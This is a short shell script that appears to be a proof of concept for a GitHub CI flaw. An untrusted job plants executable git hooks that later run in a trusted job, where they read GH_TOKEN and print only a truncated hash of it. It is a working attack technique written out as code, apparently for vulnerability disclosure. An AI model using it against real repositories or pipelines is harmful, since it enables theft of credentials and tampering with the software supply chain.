#!/bin/sh
# Attacker-controlled step in the UNTRUSTED job: plant hooks into .git/
# The hook runs later in the TRUSTED job (manage-pr). It only proves access by
# printing a SHA-256 of the token (never the token itself).
cat > .git/hooks/post-checkout <<'H'
#!/bin/sh
echo "PoC: hook from untrusted job running in trusted job; sha256(GH_TOKEN)=$(printf %s "$GH_TOKEN" | sha256sum | cut -c1-16)" >&2
H
cp .git/hooks/post-checkout .git/hooks/pre-push
chmod +x .git/hooks/post-checkout .git/hooks/pre-push
